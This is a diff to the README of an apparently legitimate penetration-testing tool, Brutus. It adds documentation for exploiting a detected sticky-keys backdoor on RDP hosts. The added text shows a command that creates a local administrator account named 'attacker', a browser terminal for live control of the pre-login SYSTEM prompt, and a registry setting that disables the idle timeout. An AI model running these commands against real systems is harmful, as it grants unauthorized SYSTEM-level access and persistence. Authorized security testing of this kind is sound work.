@@ -479,9 +479,9 @@ naabu -host 192.168.1.0/24 -p 80,443,8080 -silent | \
 
 ## Known Limitations
 
-### RDP: Sticky Keys Backdoor Detection
+### RDP: Sticky Keys Backdoor Detection & Exploitation
 
-Brutus includes automatic detection of the **sticky keys backdoor** (MITRE ATT&CK [T1546.008](https://attack.mitre.org/techniques/T1546/008/)) on RDP targets. This pre-authentication check runs on every RDP target automatically — no credentials required.
+Brutus includes automatic detection of the **sticky keys backdoor** (MITRE ATT&CK [T1546.008](https://attack.mitre.org/techniques/T1546/008/)) on RDP targets. This pre-authentication check runs on non-NLA RDP targets — no credentials required.
 
 **How it works:**
 
@@ -493,9 +493,6 @@ Brutus includes automatic detection of the **sticky keys backdoor** (MITRE ATT&C
 6. Optionally confirms via Claude Vision API (when `ANTHROPIC_API_KEY` is set)
 
 ```bash
-# RDP credential testing (sticky keys detection off by default)
-brutus --target 10.0.0.50:3389 --protocol rdp -u administrator -p Password1
-
 # Enable sticky keys backdoor detection (heuristic only)
 brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys
 
@@ -510,6 +507,44 @@ brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys --experimental-ai
 sethc.exe has been replaced with cmd.exe or similar.
 SYSTEM-level unauthenticated access available via 5x Shift.
 ```
+
+#### Command Execution via Sticky Keys (`--sticky-keys-exec`)
+
+Once a backdoor is detected, execute a command on the remote system through the pre-auth command prompt:
+
+```bash
+# Execute a single command via the backdoor
+brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys --sticky-keys-exec "whoami"
+
+# Add a local admin account
+brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys \
+  --sticky-keys-exec "net user attacker P@ssw0rd /add && net localgroup administrators attacker /add"
+```
+
+This connects, triggers the backdoor, types the command, presses Enter, waits for output, and saves a PNG screenshot of the result.
+
+#### Interactive Web Terminal (`--sticky-keys-web`)
+
+Launch a browser-based RDP viewer for live interaction with the backdoor command prompt:
+
+```bash
+# Start interactive web terminal
+brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys --sticky-keys-web
+```
+
+This starts a local HTTP server with:
+- **Live screen streaming** at ~10 FPS (JPEG over WebSocket)
+- **Full keyboard forwarding** (PS/2 scancodes mapped from browser KeyboardEvent)
+- **Mouse support** (click, move, right-click)
+- **Connection status** with disconnect overlay showing error details
+
+Open the displayed URL (e.g., `http://127.0.0.1:<port>`) in any browser to interact with the remote RDP session.
+
+> **Note:** Non-NLA RDP sessions have a server-side idle timeout (Windows default varies by configuration, typically controlled by Group Policy at `Computer Configuration > Administrative Templates > Remote Desktop Services > Session Time Limits`). If the session disconnects, the web terminal shows a "Session Disconnected" overlay. To extend the timeout on a test target, set `MaxIdleTime` to `0` in the registry:
+>
+> ```
+> HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\MaxIdleTime = 0 (DWORD)
+> ```
 
 **B-TP (Benign True Positive) considerations:** The backdoor replacement may also indicate forgotten password recovery procedures or artifacts from authorized penetration tests.
 
